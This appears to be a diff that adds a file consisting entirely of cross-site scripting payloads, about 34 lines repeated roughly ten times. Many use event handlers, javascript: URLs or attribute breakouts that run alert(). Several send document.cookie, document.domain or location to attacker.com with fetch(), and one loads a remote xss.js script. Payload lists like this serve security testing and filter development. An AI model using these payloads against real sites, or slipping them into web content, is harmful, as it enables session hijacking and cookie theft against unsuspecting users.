@@ -1,0 +1,340 @@
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
+<script src="https://attacker.com/xss.js"></script>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<body onload="fetch('https://attacker.com?l='+location)">
+<input value="<img src=x onerror=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(document.cookie)></svg>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+<button onclick="alert(1)">Click</button>
+"><img src=x onerror=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<a href="javascript:alert(document.cookie)">Click</a>
+"><img src=x onerror=alert(1)>
+<svg><g onload=alert(1)></g></svg>
+<x onmouseover=alert(1)>Hover</x>
+<iframe src=javascript:alert(1)></iframe>
+<svg onload=alert(1)></svg>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<x onmouseover=alert(document.domain)>Hover</x>
+<img src=x onerror=alert(location)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><img src=x onerror=alert('XSS')>
